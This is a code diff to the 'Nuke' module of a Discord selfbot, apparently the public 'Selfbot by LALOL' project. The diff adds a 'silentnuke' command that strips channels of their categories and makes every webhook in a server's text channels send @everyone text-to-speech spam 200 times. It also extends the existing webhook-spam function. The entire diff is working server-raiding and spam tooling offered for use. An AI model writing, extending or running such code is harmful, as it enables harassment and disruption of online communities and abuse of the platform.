@@ -11,7 +11,7 @@ async def remove(object):
 	try: await object.delete()
 	except: pass
 async def check(ctx):
-	if not config['nuke_commands']:
+	if not config['OTHER']['nuke_commands']:
 		await ctx.message.edit(content='**__Selfbot by LALOL__\n\n:warning: Краш команды отключены! Для того чтобы включить краш команды измените файл config.json**')
 		return False
 	try: await ctx.message.delete()
@@ -26,8 +26,11 @@ async def create_webhook(channel, message):
 	create_task(spam(webhook, message))
 async def spam(webhook, message):
 	for i in range(200):
-		try:await webhook.send(message, tts=True, username='Selfbot by LALOL')
+		try:await webhook.send(message, tts=True, username='Selfbot by LALOL', avatar_url='https://raw.githubusercontent.com/Its-LALOL/Discord-Selfbot/main/cogs/icon.png')
 		except:pass
+async def edit_channel(channel):
+	try: await channel.edit(category=None)
+	except: pass
 class Nuke(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
@@ -82,5 +85,18 @@ class Nuke(commands.Cog):
 			create_task(Nuke.spamchannels(self, ctx))
 			await sleep(20)
 			create_task(Nuke.spamwebhooks(self, ctx))
+	@commands.command()
+	async def silentnuke(self, ctx, server_id: int=None, *, message='||@everyone|| **__Selfbot by LALOL__ https://github.com/Its-LALOL/Discord-Selfbot**'):
+		if await check(ctx):
+			if server_id is None: server_id=ctx.guild.id
+			guild=''
+			for guildd in self.bot.guilds:
+				if guildd.id==server_id:
+					guild=guildd
+			for channel in guild.channels:
+				create_task(edit_channel(channel))
+			for channel in guild.text_channels:
+				for webhook in await channel.webhooks():
+					create_task(spam(webhook, message))
 def setup(bot):
 	bot.add_cog(Nuke(bot))
